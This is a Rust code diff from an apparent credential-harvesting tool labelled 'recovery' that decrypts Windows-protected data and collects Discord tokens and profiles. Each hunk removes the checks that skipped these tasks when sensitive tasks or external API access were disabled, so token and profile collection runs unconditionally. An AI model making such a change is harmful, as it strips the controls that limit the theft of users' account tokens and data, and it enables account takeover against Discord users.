@@ -3,7 +3,6 @@ use crate::recovery::context::RecoveryContext;
 use crate::recovery::output::write_json_artifact;
 use crate::recovery::registry::format_reg_value;
 use crate::recovery::services::wallet_specs;
-use crate::recovery::settings::RecoveryControl;
 use crate::recovery::task::{RecoveryArtifact, RecoveryCategory, RecoveryError, RecoveryTask};
 use aes_gcm::aead::Aead;
 use aes_gcm::{Aes256Gcm, KeyInit, Nonce};
@@ -23,7 +22,6 @@ use std::time::Duration;
 use tokio::fs;
 use tokio::io::AsyncReadExt;
 use tokio::sync::OnceCell;
-use tracing::info;
 use windows::Win32::Foundation::{HLOCAL, LocalFree};
 use windows::Win32::Security::Cryptography::{
     CRYPT_INTEGER_BLOB, CRYPTPROTECT_UI_FORBIDDEN, CryptUnprotectData,
@@ -409,11 +407,6 @@ impl RecoveryTask for DiscordTokenTask {
     }
 
     async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
-        let control = RecoveryControl::global();
-        if !control.allow_sensitive_tasks() {
-            info!("discord tokens task skipped (sensitive tasks disabled)");
-            return Ok(Vec::new());
-        }
 
         let records = cached_discord_tokens(&self.roots).await?;
 
@@ -733,17 +726,6 @@ impl RecoveryTask for DiscordProfileTask {
     }
 
     async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
-        let control = RecoveryControl::global();
-        if !control.allow_sensitive_tasks() {
-            info!("discord profiles task skipped (sensitive tasks disabled)");
-            return Ok(Vec::new());
-        }
-
-        if !control.allow_external_api() {
-            info!("discord profiles task skipped (external API access disabled)");
-            return Ok(Vec::new());
-        }
-
         let profiles = cached_discord_profiles(&self.roots).await?;
 
         let artifact = write_json_artifact(
@@ -788,17 +770,6 @@ impl RecoveryTask for DiscordServiceTask {
     }
 
     async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
-        let control = RecoveryControl::global();
-        if !control.allow_sensitive_tasks() {
-            info!("discord service helper skipped (sensitive tasks disabled)");
-            return Ok(Vec::new());
-        }
-
-        if !control.allow_external_api() {
-            info!("discord service helper skipped (external API access disabled)");
-            return Ok(Vec::new());
-        }
-
         let profiles = cached_discord_profiles(&self.roots).await?;
 
         let mut user_builder = String::new();
